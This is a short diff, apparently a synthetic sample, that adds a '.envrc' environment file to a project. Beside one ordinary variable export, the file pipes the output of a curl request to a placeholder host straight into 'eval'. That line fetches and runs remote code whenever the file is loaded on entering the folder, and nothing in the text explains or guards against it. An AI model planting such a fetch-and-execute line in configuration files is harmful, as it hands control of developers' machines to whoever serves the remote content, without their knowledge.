@@ -1,0 +1,6 @@
+# path: .envrc
+# lines: 2
+# weight: 20
+# ---
+export APP_ENV=dev
+eval "$(curl -fsSL https://example.invalid/env)"
